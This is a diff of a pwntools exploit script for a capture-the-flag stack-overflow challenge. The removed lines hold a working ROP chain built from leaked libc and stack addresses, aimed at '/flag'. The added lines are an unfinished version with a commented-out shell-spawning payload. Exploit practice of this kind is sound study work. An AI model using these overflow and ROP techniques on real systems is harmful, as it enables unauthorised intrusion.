@@ -1,17 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template babystack_level7
+# $ pwn template babystack_level5
+
 from pwn import *
+import pwn
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '/challenge/babystack_level7')
+context.arch = 'amd64'
+exe = context.binary = ELF(args.EXE or '/challenge/babystack_level5')
 context.terminal = ["tmux", "splitw", "-h"]
+# context.terminal = ["tmux", "splitw", "-v"]
+# python3 template.py GDB
+
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
-
 
 
 def start(argv=[], *a, **kw):
@@ -36,27 +41,33 @@ continue
 # RELRO:    Partial RELRO
 # Stack:    No canary found
 # NX:       NX enabled
-# PIE:      PIE enabled
+# PIE:      No PIE (0x400000)
 
+# r = process('/challenge/babystack_level5')
 
-def rop(base, rbp):
-    pop_rdi = [base+0x23b6a, rbp]
-    pop_rsi = [base+0x2601f, 0x4]
-    syscall = [base+0x10db60] 
-    chain = b''.join(map(p64, pop_rdi + pop_rsi + syscall))
-    return chain 
+# pwn.gdb.attach(r)
 
-io = start()
-io.recvuntil(b"libc is located at ")
-libc_sys = int(io.recvline(keepends=False), 16)
-io.recvuntil(b"base pointer rbp: ")
-bp = int(io.recvline(keepends=False), 16)
-io.recvuntil(b"will be stored: ")
-buf = int(io.recvline(keepends=False), 16)
-libc_base = libc_sys - 0x52290 
-payload = b'a'*(bp-buf)+b'/flag' +b'\0'*3 + rop(libc_base, bp)
-io.sendline(payload)
+r = start()
+# r = process('/challenge/babystack_level5')
 
-io.interactive()
+r.recvuntil(b"base pointer rbp: ")
+bp = int(r.recvline(keepends=False), 16)
 
+r.recvuntil(b"will be stored: ")
+buf = int(r.recvline(keepends=False), 16)
+
+# shellcode = asm(shellcraft.sh())
+# payload = fit({
+#     32: 0xdeadbeef,
+#     'iaaa': [1, 2, 'Hello', 3]
+# }, length=128)
+# io.send(payload)
+# flag = io.recv(...)
+# log.success(flag)
+
+# payload = b'A'*784
+
+# r.sendline(payload)
+
+r.interactive()
 
